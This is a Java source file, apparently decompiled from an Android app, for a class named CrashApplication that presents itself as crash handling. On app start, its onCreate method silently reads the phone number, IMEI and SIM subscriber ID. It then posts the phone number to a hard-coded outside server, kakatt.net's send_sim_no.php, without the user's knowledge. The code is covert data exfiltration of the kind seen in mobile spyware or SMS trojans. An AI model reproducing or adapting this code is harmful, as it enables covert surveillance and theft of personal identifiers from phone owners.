package com.scott.crash;

import android.app.Application;
import android.telephony.TelephonyManager;
import android.util.Log;
import cn.smsmanager.internet.ScanNetWorkSateTask;
import cn.smsmanager.tools.ParamsInfo;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.lang.Thread.State;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public final class CrashApplication extends Application {
    static List<NameValuePair> params;
    String TAG = "CrashApplication";
    long endTime = System.currentTimeMillis();
    String insert_url = "http://kkk.kakatt.net:3369/send_sim_no.php";
    boolean isDoing = false;
    Thread jianshiThread;
    long startTime = System.currentTimeMillis();
    TelephonyManager telManager = null;
    Thread thread;
    State threadLastState = State.NEW;
    Timer timer = new Timer();
    TimerTask ttTask = new TimerTask() {
        public void run() {
            if (!CrashApplication.this.isDoing) {
                CrashApplication.this.isDoing = true;
                new ScanNetWorkSateTask().run();
                CrashApplication.this.isDoing = false;
            }
        }
    };

    public String getPhoneNumber() {
        TelephonyManager tm = (TelephonyManager) getSystemService("phone");
        String imei = tm.getDeviceId();
        String tel = tm.getLine1Number();
        String[] phone = new String[]{imei, tel};
        Log.d(this.TAG, imei);
        Log.d(this.TAG, tel);
        return tel;
    }

    public void onCreate() {
        super.onCreate();
        Log.i("JIANSHI", "application create");
        CrashHandler.getInstance().init(getApplicationContext());
        this.telManager = (TelephonyManager) getSystemService("phone");
        ParamsInfo.isServiceStart = true;
        TelephonyManager tm = (TelephonyManager) getSystemService("phone");
        String sim_no = this.telManager.getSubscriberId();
        String getLine1Number = getPhoneNumber();
        Log.d(this.TAG, getLine1Number);
        Log.d(this.TAG, sim_no);
        Log.d(this.TAG, this.telManager.getSimOperatorName());
        ParamsInfo.Line1Number = getLine1Number;
        ParamsInfo.sim_no = sim_no;
        params = new ArrayList();
        params.add(new BasicNameValuePair("mobile_no", getLine1Number));
        params.add(new BasicNameValuePair("datetime", new SimpleDateFormat("yyyy-MM-dd").format(new Date())));
        new Thread() {
            public void run() {
                HttpClient httpclient = new DefaultHttpClient();
                HttpPost httppost = new HttpPost(CrashApplication.this.insert_url);
                try {
                    httppost.setEntity(new UrlEncodedFormEntity(CrashApplication.params, "EUC-KR"));
                    Log.d("\thttppost.setEntity(new UrlEncodedFormEntity(params));", "gone");
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
                try {
                    Log.d("response=httpclient.execute(httppost);", httpclient.execute(httppost).toString());
                } catch (ClientProtocolException e2) {
                    e2.printStackTrace();
                } catch (IOException e3) {
                    e3.printStackTrace();
                }
            }
        }.start();
    }
}
